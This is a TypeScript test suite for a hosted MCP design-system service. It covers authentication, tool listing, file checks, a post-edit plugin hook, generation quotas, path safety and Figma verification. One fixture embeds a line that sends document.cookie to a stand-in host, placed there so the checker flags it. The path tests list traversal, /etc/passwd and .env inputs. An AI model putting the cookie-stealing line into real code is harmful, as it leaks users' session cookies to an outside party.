// The hosted MCP server, end to end: an agent signs in with an account key over HTTP, lists the design systems,
// checks files, and verifies the Carbon React golden reference against its Figma frame. No model runs.

import { spawn } from "node:child_process";
import { existsSync, mkdtempSync, readFileSync, readdirSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { join, resolve } from "node:path";
import { afterAll, beforeAll, describe, expect, it } from "vitest";
import { Client, StreamableHTTPClientTransport } from "@modelcontextprotocol/client";
import { ScriptedLlm } from "@tulpar/core";
import { Accounts } from "../src/accounts.ts";
import { safePath } from "../src/hosted-mcp.ts";
import { startServer } from "../src/server.ts";
import { orderCard } from "../../cli/test/golden/harness.ts";

const repo = resolve(import.meta.dirname, "../..");
const reference = join(repo, "cli/test/golden/carbon-react");
const installed = existsSync(join(repo, "examples/carbon-react/node_modules/@carbon/react"));

describe("hosted MCP server", { timeout: 240_000 }, () => {
  let server: { url: string; close: () => Promise<void> };
  const accounts = new Accounts(":memory:", { trial: 1, pro: 5 });
  // The model answers with the golden reference: a real job runs through the queue, at no cost.
  const golden = readdirSync(reference).map((f) => ({ path: f, content: readFileSync(join(reference, f), "utf8") }));
  const model = new ScriptedLlm([{ files: golden, notes: "" }]);
  const auth = { clientId: "id", clientSecret: "secret", sessionSecret: "s3cret", origin: "http://localhost", secureCookies: false };
  let client: Client;
  let key = "";

  beforeAll(async () => {
    server = await startServer({ repoRoot: repo, llm: () => model, auth, accounts, runsPerHour: 100, log: () => {}, rerank: false }, 0);
    const me = accounts.signIn({ githubId: 7, login: "agent-owner" });
    key = accounts.createToken(me.id, "mcp");
    client = new Client({ name: "test-agent", version: "1.0.0" });
    await client.connect(new StreamableHTTPClientTransport(new URL(`${server.url}/mcp`), { requestInit: { headers: { authorization: `Bearer ${key}` } } }));
  });
  afterAll(async () => {
    await client?.close();
    await server?.close();
  });

  it("refuses a call without an account key, or with a wrong one", async () => {
    const call = (authorization?: string) => fetch(`${server.url}/mcp`, { method: "POST", headers: { "content-type": "application/json", accept: "application/json, text/event-stream", ...(authorization && { authorization }) }, body: JSON.stringify({ jsonrpc: "2.0", id: 1, method: "tools/list" }) });
    expect((await call()).status).toBe(401);
    expect((await call("Bearer tlp_wrong")).status).toBe(401);
  });

  it("lists its tools and the design systems", async () => {
    const tools = (await client.listTools()).tools.map((t) => t.name).sort();
    expect(tools).toEqual(["tulpar_check", "tulpar_generate", "tulpar_projects", "tulpar_result", "tulpar_verify"]);
    const r = await client.callTool({ name: "tulpar_projects", arguments: {} });
    expect((r.structuredContent as { projects: { id: string }[] }).projects.map((p) => p.id)).toContain("carbon-react");
  });

  it("checks files: a hard-coded colour and an unsafe call are found, paths as sent", async () => {
    const r = await client.callTool({
      name: "tulpar_check",
      arguments: {
        project: "carbon-react",
        files: [
          { path: "Card.tsx", content: 'import "./Card.css";\nexport default function Card() {\n  fetch("https://collect.example/?c=" + document.cookie);\n  return <section className="card">Hi</section>;\n}\n' },
          { path: "Card.css", content: ".card {\n  color: #ff0000;\n}\n" },
        ],
      },
    });
    const findings = (r.structuredContent as { findings: { kind: string; file: string }[] }).findings;
    expect(findings.map((f) => `${f.kind} ${f.file}`)).toEqual(expect.arrayContaining(["hard-coded Card.css", "unsafe Card.tsx"]));
  });

  it("hands findings back to the agent from the plugin's hook after an edit, and stays silent without a key", async () => {
    const dir = mkdtempSync(join(tmpdir(), "tulpar-hook-"));
    writeFileSync(join(dir, "Card.tsx"), 'import "./Card.css";\nexport default function Card() {\n  return <section className="card">Hi</section>;\n}\n');
    writeFileSync(join(dir, "Card.css"), ".card {\n  color: #ff0000;\n}\n");
    const hook = join(repo, "claude-plugin/scripts/check-after-edit.mjs");
    const event = JSON.stringify({ hook_event_name: "PostToolUse", tool_name: "Edit", tool_input: { file_path: join(dir, "Card.css") } });
    const run = (env: Record<string, string>) =>
      new Promise<{ code: number | null; out: string }>((done) => {
        const child = spawn(process.execPath, [hook], { env: { ...process.env, ...env } });
        let out = "";
        child.stdout.on("data", (d) => (out += d));
        child.on("close", (code) => done({ code, out }));
        child.stdin.end(event);
      });
    const found = await run({ TULPAR_KEY: key, TULPAR_PROJECT: "carbon-react", TULPAR_URL: server.url });
    expect(found.code).toBe(0);
    const context = JSON.parse(found.out).hookSpecificOutput;
    expect(context.hookEventName).toBe("PostToolUse");
    expect(context.additionalContext).toMatch(/^Tulpar checked Card against the carbon-react design system and found \d+ problem/);
    expect(context.additionalContext).toMatch(/Card\.css:2 hard-coded/);
    const silent = await run({ TULPAR_KEY: "", TULPAR_PROJECT: "carbon-react", TULPAR_URL: server.url });
    expect(silent).toEqual({ code: 0, out: "" });
  });

  it.skipIf(!installed)("generates through the site's own jobs, charged to the account, and returns the verified files when done", async () => {
    const figmaNode = orderCard({ font: "IBM Plex Sans", title: [20, 28], body: [14, 20], padding: 16, gap: 8 });
    const started = await client.callTool({ name: "tulpar_generate", arguments: { project: "carbon-react", name: "OrderCard", figmaNode } });
    const { jobId } = started.structuredContent as { jobId: string };
    expect(jobId).toMatch(/^[a-f0-9-]{36}$/);
    let r: { state: string; status?: string; files?: { path: string; content: string }[]; findings?: unknown[] } = { state: "queued" };
    for (let i = 0; i < 90 && (r.state === "queued" || r.state === "running"); i++) {
      if (i) await new Promise((done) => setTimeout(done, 2000));
      r = (await client.callTool({ name: "tulpar_result", arguments: { jobId } })).structuredContent as typeof r;
    }
    expect(r.state).toBe("done");
    expect(["verified", "unchecked-remain"]).toContain(r.status);
    expect(r.findings).toEqual([]);
    expect(r.files!.map((f) => f.path).sort()).toEqual(["OrderCard.css", "OrderCard.test.tsx", "OrderCard.tsx"]);
    // The trial had one generation: it is spent, and the next one is refused as from the page.
    const again = await client.callTool({ name: "tulpar_generate", arguments: { project: "carbon-react", name: "OrderCard", figmaNode } });
    expect(again.isError).toBe(true);
    // The clean copy, as a team ships it.
    const clean = (await client.callTool({ name: "tulpar_result", arguments: { jobId, withoutFigmaIds: true } })).structuredContent as typeof r;
    expect(clean.files!.find((f) => f.path === "OrderCard.tsx")!.content).not.toContain("data-figma-id");
  });

  it("refuses a path that leaves the component's folder", async () => {
    const r = await client.callTool({ name: "tulpar_check", arguments: { project: "carbon-react", files: [{ path: "../../tulpar.json", content: "{}" }] } });
    expect(r.isError).toBe(true);
    expect(safePath("a/../../b")).toBeUndefined();
    expect(safePath("/etc/passwd")).toBeUndefined();
    expect(safePath(".env")).toBeUndefined();
    expect(safePath("styles/Card.css")).toBe("styles/Card.css");
  });

  it.skipIf(!installed)("verifies the golden reference against its frame: every check that ran passes, with structured findings", async () => {
    const files = readdirSync(reference).map((f) => ({ path: f, content: readFileSync(join(reference, f), "utf8") }));
    const figmaNode = orderCard({ font: "IBM Plex Sans", title: [20, 28], body: [14, 20], padding: 16, gap: 8 });
    const r = await client.callTool({ name: "tulpar_verify", arguments: { project: "carbon-react", files, entry: "OrderCard.tsx", test: "OrderCard.test.tsx", figmaNode } }, { timeout: 180_000 });
    const s = r.structuredContent as { verdict: string; checks: { id: string; status: string }[]; findings: unknown[] };
    expect(s.checks.filter((c) => c.status === "fail"), JSON.stringify(s.findings)).toEqual([]);
    expect(s.checks.filter((c) => c.status === "pass").map((c) => c.id)).toEqual(expect.arrayContaining(["build", "render", "colors", "layout", "text", "tests", "safety"]));
    expect(s.findings).toEqual([]);
    // A planted defect comes back as a finding with its element and fix.
    const broken = files.map((f) => (f.path === "OrderCard.css" ? { ...f, content: f.content.replace(/\n\s*padding: [^\n]*;/, "") } : f));
    const b = (await client.callTool({ name: "tulpar_verify", arguments: { project: "carbon-react", files: broken, entry: "OrderCard.tsx", test: "OrderCard.test.tsx", figmaNode } }, { timeout: 180_000 })).structuredContent as { verdict: string; findings: { check: string; element?: { id: string } }[] };
    expect(b.verdict).toBe("fail");
    expect(b.findings.some((f) => f.check === "layout" && f.element?.id === "900:2")).toBe(true);
  });
});
